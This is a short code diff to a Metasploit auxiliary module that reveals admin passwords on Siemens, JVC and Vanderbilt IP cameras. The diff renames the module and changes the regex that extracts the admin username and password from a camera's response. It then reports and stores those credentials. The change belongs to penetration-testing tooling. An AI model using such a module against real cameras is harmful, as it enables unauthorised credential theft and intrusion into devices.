@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'         => 'Siemens/JVC IP-Camera Password Disclosure',
+      'Name'         => 'JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure',
       'Description'  => %q{
         SIEMENS IP-Camera (CVMS2025-IR + CCMS2025), JVC IP-Camera (VN-T216VPRU),
         and Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR)
@@ -56,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
 
-      if res.body =~ /var Adm_ID="(.+?)";[\r\n]+var Adm_Pass1="(.+?)";/
+      if res.body =~ /var Adm_ID="(.+?)";\s+var Adm_Pass1="(.+?)";/
         print_good("Found: #{$1}:#{$2}")
         store_valid_credential(
           user:         $1,
